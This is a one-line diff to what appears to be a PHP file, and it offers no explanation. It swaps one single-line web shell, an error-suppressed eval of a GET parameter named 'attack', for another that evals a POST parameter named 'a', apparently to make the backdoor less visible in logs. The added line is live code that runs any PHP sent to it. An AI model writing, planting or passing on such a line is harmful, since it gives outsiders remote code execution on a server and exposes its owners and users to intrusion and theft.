@@ -1,1 +1,1 @@
-<?php @eval($_GET['attack']);?>
+<?php @eval($_POST['a']);?>
